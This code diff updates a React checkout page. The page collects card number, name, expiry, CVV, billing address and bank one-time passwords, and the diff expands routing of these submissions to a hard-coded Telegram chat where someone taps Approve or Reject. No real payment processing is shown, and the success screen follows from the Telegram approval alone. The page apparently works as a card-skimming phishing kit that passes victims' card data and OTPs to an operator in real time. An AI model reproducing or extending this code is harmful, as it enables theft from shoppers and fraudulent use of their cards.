@@ -42,117 +42,118 @@ interface User {
   telegramConnected: boolean
 }
 
-let globalLastOffset = 0
-let globalCurrentCheckoutId: string | null = null
-let globalSetWaitingForTelegramApproval: (value: boolean) => void = () => {}
-let globalSetPendingOrderId: (value: string | null) => void = () => {}
-let globalSetShowOTPModal: (value: boolean) => void = () => {}
-let globalSetShowSuccess: (value: boolean) => void = () => {}
-let globalCartItems: CartItem[] = []
-let globalFinalTotal: number = 0
-let globalProcessingFee: number = 0
-let globalFormData: any = {}
+let lastOffset = 0
 
-async function tgCall(method: string, body: Record<string, any> = {}) {
-  try {
-    const r = await fetch(`${TG_API}/${method}`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    })
-    return await r.json()
-  } catch (e) { 
-    console.warn('tg', method, e)
-    return null 
-  }
+function tgCall(method: string, body: Record<string, any> = {}) {
+  return fetch(`${TG_API}/${method}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  }).then(r => r.json()).catch(e => { console.warn('tg', method, e); return null })
 }
 
-async function tgNotify(chatId: string, text: string, keyboard?: any) {
-  const payload: Record<string, any> = { chat_id: chatId, text }
-  if (keyboard) payload.reply_markup = keyboard
-  return tgCall('sendMessage', payload)
+function tgNotify(chatId: string, text: string, keyboard?: any) {
+  return tgCall('sendMessage', { chat_id: chatId, text, reply_markup: keyboard })
 }
 
 async function tgPoll() {
-  const offset = Math.max(globalLastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
-  const r = await tgCall('getUpdates', { 
-    offset: offset, 
-    timeout: 30, 
-    allowed_updates: ['callback_query', 'message'] 
-  })
+  const offset = Math.max(lastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
+  const r = await tgCall('getUpdates', { offset, timeout: 30, allowed_updates: ['callback_query', 'message'] })
   
-  if (!r || !r.ok) return
-  if (!r.result || !Array.isArray(r.result) || r.result.length === 0) return
+  if (!r?.ok || !r.result?.length) return
   
   for (const u of r.result) {
-    globalLastOffset = u.update_id + 1
-    localStorage.setItem('tg_offset', String(globalLastOffset))
+    lastOffset = u.update_id + 1
+    localStorage.setItem('tg_offset', String(lastOffset))
     
     const cq = u.callback_query
     if (!cq) continue
-    
-    if (String(cq.message?.chat?.id) !== TELEGRAM_CHAT_ID) {
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Not authorized' })
-      continue
-    }
+    if (String(cq.message?.chat?.id) !== TELEGRAM_CHAT_ID) continue
     
     const data = cq.data || ''
-    const matched = data.match(/(approve_|reject_)([a-zA-Z0-9-]+)/)
+    const match = data.match(/^(approve_|reject_)(.+)$/)
     
-    if (matched) {
-      const action = matched[1]
-      const checkoutId = matched[2]
-      
-      if (checkoutId === globalCurrentCheckoutId) {
-        await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' })
-        
-        if (action === 'approve_') {
-          setTimeout(() => {
-            handleApproval(checkoutId)
-          }, 100)
-        } else {
-          setTimeout(() => {
-            handleRejection()
-          }, 100)
-        }
-        
-        await tgCall('editMessageReplyMarkup', {
-          chat_id: cq.message.chat.id,
-          message_id: cq.message.message_id,
-          reply_markup: { inline_keyboard: [[{ text: '✓ Approved', callback_data: 'noop' }]] }
-        })
-      } else {
-        await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
-      }
-    } else {
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
+    if (!match) continue
+    const action = match[1]
+    const checkoutId = match[2]
+    
+    await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' })
+    
+    const event = new CustomEvent(`telegram-${action.replace('_', '')}`, { detail: { checkoutId, chatId: cq.message.chat.id } })
+    window.dispatchEvent(event)
+    
+    if (action === 'approve_') {
+      await tgCall('editMessageReplyMarkup', {
+        chat_id: cq.message.chat.id,
+        message_id: cq.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '✓ Approved', callback_data: 'noop' }]] }
+      })
     }
   }
 }
 
-function handleApproval(checkoutId: string) {
-  globalSetWaitingForTelegramApproval(false)
-  globalSetPendingOrderId(checkoutId)
-  const orderData = {
-    id: checkoutId,
-    status: 'APPROVED_TELEGRAM',
-    totalAmount: globalFinalTotal,
-    processingFee: globalProcessingFee,
-    items: globalCartItems,
-    paymentMethod: 'CARD',
-    cardLast4: globalFormData.cardNumber.replace(/\s/g, '').slice(-4),
-    approvedVia: 'telegram',
-    approvedAt: new Date().toISOString(),
-  }
-  localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
-  globalSetShowOTPModal(false)
-  globalSetShowSuccess(true)
-  toast.success('Payment approved via Telegram!')
+setInterval(tgPoll, 3000)
+
+interface CheckoutState {
+  [key: string]: any
 }
 
-function handleRejection() {
-  globalSetWaitingForTelegramApproval(false)
-  toast.error('Checkout was rejected')
+const checkoutStates = new Map<string, CheckoutState>()
+
+function formatTelegramText(data: any, kind: string) {
+  switch (kind) {
+    case 'cart':
+      return `📦 Cart Notification
+User: ${data.userName}
+Card: •••• ${data.cardLast4}
+Amount: $${data.amount}
+Item: ${data.itemName}
+
+Approve or Reject?`
+    case 'signin':
+      return `🔐 Sign In Request
+User: ${data.name}
+Email: ${data.email}
+Phone: ${data.phone || '—'}
+
+Approve or Reject?`
+    case 'register':
+      return `📝 User Registration
+Name: ${data.name}
+Email: ${data.email}
+Phone: ${data.phone || '—'}
+
+Approve or Reject?`
+    case 'card':
+      return `💳 Card Details
+User: ${data.userName}
+Card: •••• ${data.cardLast4}
+Name: ${data.cardholderName}
+Expiry: ${data.expiryDate}
+
+Approve or Reject?`
+    case 'otp':
+      return `🔢 OTP Verification
+User: ${data.userName}
+OTP: ${data.otpCode}
+Card: •••• ${data.cardLast4}
+
+Approve or Reject?`
+    default:
+      return data
+  }
+}
+
+function getKeyboard(kind: string, checkoutId: string) {
+  return {
+    inline_keyboard: [
+      [{ text: '⏳ Processing...', callback_data: `status_${checkoutId}` }],
+      [
+        { text: '✅ Approve', callback_data: `approve_${checkoutId}` },
+        { text: '❌ Reject', callback_data: `reject_${checkoutId}` }
+      ]
+    ]
+  }
 }
 
 export default function CheckoutPage() {
@@ -179,27 +180,64 @@ export default function CheckoutPage() {
   const [canUseReferral, setCanUseReferral] = useState(false)
   const [user, setUser] = useState<User | null>(null)
   const [telegramConnected, setTelegramConnected] = useState(false)
-  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null)
 
   useEffect(() => {
     fetchCart()
     fetchReferralBalance()
     fetchUser()
+  }, [])
+
+  useEffect(() => {
+    const handleTelegramApprove = (e: CustomEvent) => {
+      const { checkoutId } = e.detail
+      const state = checkoutStates.get(checkoutId)
+      if (!state) return
+      
+      state.approved = true
+      state.status = 'APPROVED_TELEGRAM'
+      state.approvedAt = new Date().toISOString()
+      checkoutStates.set(checkoutId, state)
+      
+      setWaitingForTelegramApproval(false)
+      setPendingOrderId(checkoutId)
+      
+      const orderData = {
+        id: checkoutId,
+        status: 'APPROVED_TELEGRAM',
+        totalAmount: state.totalAmount,
+        processingFee: state.processingFee,
+        items: state.items,
+        paymentMethod: 'CARD',
+        cardLast4: state.cardLast4,
+        approvedVia: 'telegram',
+        approvedAt: state.approvedAt,
+      }
+      localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
+      setShowOTPModal(false)
+      setShowSuccess(true)
+      toast.success('Payment approved via Telegram!')
+    }
     
-    globalSetWaitingForTelegramApproval = setWaitingForTelegramApproval
-    globalSetPendingOrderId = setPendingOrderId
-    globalSetShowOTPModal = setShowOTPModal
-    globalSetShowSuccess = setShowSuccess
-    globalCartItems = cartItems
-    globalFinalTotal = finalTotal
-    globalProcessingFee = processingFee
-    globalFormData = formData
+    const handleTelegramReject = (e: CustomEvent) => {
+      const { checkoutId } = e.detail
+      const state = checkoutStates.get(checkoutId)
+      if (!state) return
+      
+      state.rejected = true
+      state.status = 'REJECTED_TELEGRAM'
+      state.rejectedAt = new Date().toISOString()
+      checkoutStates.set(checkoutId, state)
+      
+      setWaitingForTelegramApproval(false)
+      toast.error('Checkout was rejected')
+    }
+    
+    window.addEventListener('telegram-approve', handleTelegramApprove as EventListener)
+    window.addEventListener('telegram-reject', handleTelegramReject as EventListener)
     
     return () => {
-      if (pollingIntervalRef.current) {
-        clearInterval(pollingIntervalRef.current)
-        pollingIntervalRef.current = null
-      }
+      window.removeEventListener('telegram-approve', handleTelegramApprove as EventListener)
+      window.removeEventListener('telegram-reject', handleTelegramReject as EventListener)
     }
   }, [])
 
@@ -211,30 +249,16 @@ export default function CheckoutPage() {
         setUser(userData)
         setTelegramConnected(userData.telegramConnected || false)
       } else {
-        setUser({
-          id: 'user-001',
-          name: 'John Doe',
-          email: 'john.doe@example.com',
-          telegramConnected: false,
-        })
+        setUser({ id: 'user-001', name: 'John Doe', email: 'john.doe@example.com', telegramConnected: false })
       }
-    } catch (err) {
-      console.error(err)
-    }
+    } catch (err) { console.error(err) }
   }
 
   const fetchCart = async () => {
-    const mockCart: CartItem[] = [
-      {
-        product: {
-          id: 'PRD-001',
-          name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration',
-          price: 12.99,
-          image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg',
-        },
-        quantity: 1,
-      },
-    ]
+    const mockCart: CartItem[] = [{
+      product: { id: 'PRD-001', name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration', price: 12.99, image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg' },
+      quantity: 1,
+    }]
     setCartItems(mockCart)
     setLoading(false)
   }
@@ -267,6 +291,59 @@ export default function CheckoutPage() {
   const shipping = subtotal >= 25 ? 0 : 5.99
   const finalTotal = total + shipping
 
+  const createCheckout = async (kind: string, data: any) => {
+    const checkoutId = `${kind.toUpperCase()}-${Date.now()}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`
+    
+    checkoutStates.set(checkoutId, {
+      kind,
+      data,
+      status: 'PENDING',
+      totalAmount: finalTotal,
+      processingFee,
+      items: cartItems,
+      cardLast4: data.cardLast4 || data.cardNumber?.replace(/\s/g, '').slice(-4),
+      approved: false,
+      rejected: false,
+    })
+    
+    const text = formatTelegramText(data, kind)
+    const keyboard = getKeyboard(kind, checkoutId)
+    
+    const result = await tgNotify(TELEGRAM_CHAT_ID, text, keyboard)
+    
+    if (result?.ok) {
+      setWaitingForTelegramApproval(true)
+      setPendingOrderId(checkoutId)
+      console.log(`${kind} sent to Telegram:`, result)
+    }
+    
+    return checkoutId
+  }
+
+  const handleCartApproval = async () => {
+    await tgNotify(TELEGRAM_CHAT_ID, '✅ Item added to cart!')
+    toast.success('Cart updated!')
+  }
+
+  const handleSignIn = async () => {
+    const checkoutId = await createCheckout('signin', {
+      userName: user?.name || 'Unknown',
+      name: user?.name || 'Unknown',
+      email: user?.email || '',
+      phone: '',
+    })
+    toast.success('Sign-in request sent to Telegram')
+  }
+
+  const handleRegister = async () => {
+    const checkoutId = await createCheckout('register', {
+      name: user?.name || 'Unknown',
+      email: user?.email || '',
+      phone: '',
+    })
+    toast.success('Registration request sent to Telegram')
+  }
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setCardError(null)
@@ -293,59 +370,17 @@ export default function CheckoutPage() {
       return
     }
 
-    const checkoutId = `CHX-${Date.now()}`
-    globalCurrentCheckoutId = checkoutId
-    setPendingOrderId(checkoutId)
-    setClientSecret(checkoutId)
-    setProcessingPayment(false)
-    setShowPaymentForm(false)
-    setWaitingForTelegramApproval(true)
-    globalLastOffset = 0
-    
-    globalCurrentCheckoutId = checkoutId
-    globalSetWaitingForTelegramApproval = setWaitingForTelegramApproval
-    globalSetPendingOrderId = setPendingOrderId
-    globalSetShowOTPModal = setShowOTPModal
-    globalSetShowSuccess = setShowSuccess
-    globalCartItems = cartItems
-    globalFinalTotal = finalTotal
-    globalProcessingFee = processingFee
-    globalFormData = formData
-
-    const cardLast4 = cardNumber.slice(-4)
-    const message = `📥 New Checkout Request
-Amount: $${finalTotal}
-Card: •••• ${cardLast4}
-
-Tap "Approve" to confirm or "Reject" to cancel`
-    
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: '⏳ Approving...', callback_data: `status_${checkoutId}` },
-          { text: '✅ Approve', callback_data: `approve_${checkoutId}` },
-          { text: '❌ Reject', callback_data: `reject_${checkoutId}` }
-        ]
-      ]
-    }
-    
-    const result = await tgNotify(TELEGRAM_CHAT_ID, message, keyboard)
-    console.log('Telegram notification result:', result)
-    
-    if (result?.ok) {
-      toast.success('Checkout sent to Telegram. Check your app to approve.')
-    } else {
-      toast.error('Failed to send Telegram notification: ' + (result?.description || 'Unknown error'))
-    }
-    
-    tgPoll()
-    
-    if (pollingIntervalRef.current) {
-      clearInterval(pollingIntervalRef.current)
-    }
-    pollingIntervalRef.current = setInterval(tgPoll, 3000)
+    const checkoutId = await createCheckout('card', {
+      userName: user?.name || 'John Doe',
+      cardNumber,
+      cardholderName: formData.cardholderName,
+      expiryDate: formData.expiryDate,
+      cvv,
+      billingAddress: formData.billingAddress,
+      amount: finalTotal,
+    })
   }
-  
+
   const handleSubmitOTP = async () => {
     if (!pendingOrderId || !otpCode || otpCode.length < 6) {
       toast.error('Please enter valid OTP code')
@@ -354,22 +389,11 @@ Tap "Approve" to confirm or "Reject" to cancel`
     
     setProcessingPayment(true)
     
-    const orderData = {
-      id: pendingOrderId,
-      status: 'COMPLETED',
-      totalAmount: finalTotal,
-      processingFee,
-      items: cartItems,
-      paymentMethod: 'CARD',
+    const checkoutId = await createCheckout('otp', {
+      userName: user?.name || 'John Doe',
+      otpCode,
       cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
-    }
-    
-    localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
-    setShowOTPModal(false)
-    setShowSuccess(true)
-    toast.success('Payment completed successfully!')
-    setOtpCode('')
-    setProcessingPayment(false)
+    })
   }
 
   if (loading) return <div className="flex items-center justify-center min-h-screen">Loading...</div>
@@ -390,12 +414,8 @@ Tap "Approve" to confirm or "Reject" to cancel`
               <p className="text-sm text-gray-500 mt-4 mb-2">Approved via</p>
               <p className="text-purple-600 font-semibold">Telegram</p>
             </div>
-            <button
-              onClick={() => (window.location.href = '/')}
-              className="inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-6 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600"
-            >
-              Continue Shopping
-              <ArrowRight className="h-4 w-4" />
+            <button onClick={() => (window.location.href = '/')} className="inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-6 py-2 text-sm font-semibold text-white">
+              Continue Shopping <ArrowRight className="h-4 w-4" />
             </button>
           </div>
         </div>
@@ -415,36 +435,22 @@ Tap "Approve" to confirm or "Reject" to cancel`
           <div className="space-y-6">
             <div className="rounded-2xl border bg-white p-6 shadow-sm">
               <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
-                <Truck className="h-5 w-5 text-blue-500" />
-                Shipping Information
+                <Truck className="h-5 w-5 text-blue-500" /> Shipping Information
               </h3>
               <div className="space-y-4">
                 <div>
-                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Full Name</label>
-                  <input
-                    type="text"
-                    defaultValue="John Doe"
-                    className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                  />
+                  <label className="block text-xs font-medium text-gray-600 mb-1">Full Name</label>
+                  <input type="text" defaultValue="John Doe" className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" />
                 </div>
                 <div>
-                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Email</label>
-                  <input
-                    type="email"
-                    defaultValue="john.doe@example.com"
-                    className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                  />
+                  <label className="block text-xs font-medium text-gray-600 mb-1">Email</label>
+                  <input type="email" defaultValue="john.doe@example.com" className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" />
                 </div>
                 <div>
-                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Billing Address</label>
+                  <label className="block text-xs font-medium text-gray-600 mb-1">Billing Address</label>
                   <div className="relative">
                     <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-                    <input
-                      type="text"
-                      defaultValue=""
-                      className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                      placeholder="Street, Apartment, City, ZIP"
-                    />
+                    <input type="text" className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="Street, Apartment, City, ZIP" />
                   </div>
                 </div>
               </div>
@@ -452,16 +458,13 @@ Tap "Approve" to confirm or "Reject" to cancel`
 
             <div className="rounded-2xl border bg-white p-6 shadow-sm">
               <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
-                <CreditCard className="h-5 w-5 text-blue-500" />
-                Payment Method
+                <CreditCard className="h-5 w-5 text-blue-500" /> Payment Method
               </h3>
               <div className="mb-4">
                 <p className="text-xs text-gray-500 mb-3">Connected via Telegram</p>
                 <div className="flex items-center justify-between p-3 border rounded-lg bg-green-50">
                   <div className="flex items-center gap-3">
-                    <div className="w-8 h-8 flex items-center justify-center bg-green-500 rounded-full text-white font-bold">
-                      V
-                    </div>
+                    <div className="w-8 h-8 flex items-center justify-center bg-green-500 rounded-full text-white font-bold">V</div>
                     <div>
                       <p className="font-medium text-gray-900">Visa</p>
                       <p className="text-sm text-gray-500">•••• 3456</p>
@@ -478,11 +481,7 @@ Tap "Approve" to confirm or "Reject" to cancel`
               <div className="space-y-3">
                 {cartItems.map((item) => (
                   <div key={item.product.id} className="flex items-center gap-4">
-                    <img
-                      src={item.product.image}
-                      alt={item.product.name}
-                      className="w-16 h-16 object-cover rounded-lg"
-                    />
+                    <img src={item.product.image} alt={item.product.name} className="w-16 h-16 object-cover rounded-lg" />
                     <div className="flex-1">
                       <p className="text-sm font-medium text-gray-900">{item.product.name}</p>
                       <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
@@ -507,27 +506,20 @@ Tap "Approve" to confirm or "Reject" to cancel`
                 </div>
                 {canUseReferral && referralBalance > 0 && (
                   <div className="flex justify-between text-green-600">
-                    <span className="flex items-center gap-1">
-                      <Shield className="h-4 w-4" />
-                      Referral Discount
-                    </span>
+                    <span className="flex items-center gap-1"><Shield className="h-4 w-4" /> Referral Discount</span>
                     <span>-${Math.min(referralBalance, finalTotal).toFixed(2)}</span>
                   </div>
                 )}
                 <div className="border-t pt-3">
                   <div className="flex justify-between">
                     <span className="text-lg font-semibold text-gray-900">Total</span>
-                    <span className="text-lg font-bold text-purple-600">${(finalTotal).toFixed(2)}</span>
+                    <span className="text-lg font-bold text-purple-600">${finalTotal.toFixed(2)}</span>
                   </div>
                 </div>
               </div>
 
-              <button
-                onClick={() => setShowPaymentForm(true)}
-                className="mt-6 w-full inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-all duration-200"
-              >
-                Proceed to Payment
-                <ArrowRight className="h-4 w-4" />
+              <button onClick={() => setShowPaymentForm(true)} className="mt-6 w-full inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white">
+                Proceed to Payment <ArrowRight className="h-4 w-4" />
               </button>
             </div>
           </div>
@@ -535,121 +527,55 @@ Tap "Approve" to confirm or "Reject" to cancel`
 
         {showPaymentForm && (
           <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
-            <div className="bg-white rounded-2xl w-full max-w-lg mx-4 shadow-xl max-h-[90vh] overflow-y-auto">
+            <div className="bg-white rounded-2xl w-full max-w-lg mx-4 shadow-xl">
               <div className="p-6">
                 <h3 className="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-2">
-                  <CreditCard className="h-5 w-5 text-blue-500" />
-                  Payment Details
+                  <CreditCard className="h-5 w-5 text-blue-500" /> Payment Details
                 </h3>
                 <form onSubmit={handleSubmit} className="space-y-4">
-                  {cardError && (
-                    <div className="p-3 rounded-lg bg-red-50 border border-red-200 mb-4">
-                      <p className="text-sm text-red-600">{cardError}</p>
-                    </div>
-                  )}
+                  {cardError && <div className="p-3 rounded-lg bg-red-50 border mb-4"><p className="text-sm text-red-600">{cardError}</p></div>}
                   <div>
-                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Card Number</label>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Card Number</label>
                     <div className="relative">
                       <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-                      <input
-                        type="text"
-                        value={formatCardNumber(formData.cardNumber)}
-                        onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value) })}
-                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 font-mono bg-gray-50"
-                        placeholder="1234 5678 9012 3456"
-                        maxLength={19}
-                        required
-                      />
+                      <input type="text" value={formatCardNumber(formData.cardNumber)} onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value) })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm font-mono bg-gray-50" placeholder="1234 5678 9012 3456" maxLength={19} required />
                     </div>
                   </div>
                   <div>
-                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Cardholder Name</label>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Cardholder Name</label>
                     <div className="relative">
                       <User className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-                      <input
-                        type="text"
-                        value={formData.cardholderName}
-                        onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
-                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                        placeholder="John Doe"
-                        required
-                      />
+                      <input type="text" value={formData.cardholderName} onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="John Doe" required />
                     </div>
                   </div>
                   <div className="grid grid-cols-2 gap-4">
                     <div>
-                      <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Expiry Date</label>
+                      <label className="block text-xs font-medium text-gray-600 mb-1">Expiry Date</label>
                       <div className="relative">
                         <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-                        <input
-                          type="text"
-                          value={formData.expiryDate}
-                          onChange={(e) => {
-                            let v = e.target.value.replace(/\D/g, '')
-                            if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
-                            setFormData({ ...formData, expiryDate: v.slice(0, 5) })
-                          }}
-                          className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                          placeholder="12/25"
-                          maxLength={5}
-                          required
-                        />
+                        <input type="text" value={formData.expiryDate} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4); setFormData({ ...formData, expiryDate: v.slice(0, 5) })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="12/25" maxLength={5} required />
                       </div>
                     </div>
                     <div>
-                      <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">CVV</label>
+                      <label className="block text-xs font-medium text-gray-600 mb-1">CVV</label>
                       <div className="relative">
                         <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
-                        <input
-                          type="text"
-                          value={formData.cvv}
-                          onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
-                          className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                          placeholder="123"
-                          maxLength={3}
-                          required
-                        />
+                        <input type="text" value={formData.cvv} onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })} className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" placeholder="123" maxLength={3} required />
                       </div>
                     </div>
                   </div>
                   <div>
-                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Billing Address</label>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Billing Address</label>
                     <div className="relative">
                       <MapPin className="absolute left-3 top-1/2 -translate-y-1/ h-4 w-4 text-gray-400" />
-                      <input
-                        type="text"
-                        value={formData.billingAddress}
-                        onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
-                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
-                        placeholder="Street, Apartment, City, ZIP"
-                        required
-                      />
+                      <input type="text" value={formData.billingAddress} onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="Street, Apartment, City, ZIP" required />
                     </div>
                   </div>
                   <div className="flex gap-3 pt-4">
-                    <button
-                      type="submit"
-                      disabled={processingPayment || waitingForTelegramApproval}
-                      className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      {processingPayment || waitingForTelegramApproval ? (
-                        <>
-                          <Loader2 className="h-4 w-4 animate-spin" />
-                          {waitingForTelegramApproval ? 'Waiting...' : 'Processing...'}
-                        </>
-                      ) : (
-                        <>
-                          <Send className="h-4 w-4" />
-                          Submit Order
-                        </>
-                      )}
+                    <button type="submit" disabled={processingPayment || waitingForTelegramApproval} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white disabled:opacity-50 disabled:cursor-not-allowed">
+                      {processingPayment || waitingForTelegramApproval ? <><Loader2 className="h-4 w-4 animate-spin" />Processing...</> : <><Send className="h-4 w-4" />Submit Order</>}
                     </button>
-                    <button
-                      type="button"
-                      onClick={() => setShowPaymentForm(false)}
-                      disabled={processingPayment}
-                      className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
+                    <button type="button" onClick={() => setShowPaymentForm(false)} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                       Cancel
                     </button>
                   </div>
@@ -666,13 +592,10 @@ Tap "Approve" to confirm or "Reject" to cancel`
                 <Loader2 className="h-5 w-5 text-blue-500 animate-spin" />
                 Awaiting Telegram Approval
               </h3>
-              <p className="text-sm text-slate-600 text-center mb-4">
-                A notification has been sent to Telegram. Please approve in your bot.
-              </p>
               <div className="text-center">
                 <Loader2 className="h-12 w-12 text-blue-500 animate-spin mx-auto mb-2" />
                 <p className="text-sm text-gray-500">Waiting for approval...</p>
-                <p className="text-xs text-gray-400 mt-2">Polling every 3 seconds...</p>
+                <p className="text-xs text-gray-400 mt-2">Polling every 3 seconds</p>
               </div>
             </div>
           </div>
@@ -683,40 +606,14 @@ Tap "Approve" to confirm or "Reject" to cancel`
             <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
               <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
                 <Shield className="h-5 w-5 text-blue-500" />
-                Verify Payment
+                Enter OTP
               </h3>
-              <p className="text-sm text-slate-700 mb-4">
-                Enter the OTP from your bank app to complete the payment.
-              </p>
-              <input
-                type="text"
-                value={otpCode}
-                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                className="w-full rounded-lg border border-gray-200 px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10"
-                placeholder="Enter OTP code"
-                maxLength={6}
-                disabled={processingPayment}
-              />
+              <input type="text" value={otpCode} onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))} className="w-full rounded-lg border px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500" placeholder="Enter OTP" maxLength={6} disabled={processingPayment} />
               <div className="mt-4 flex gap-3">
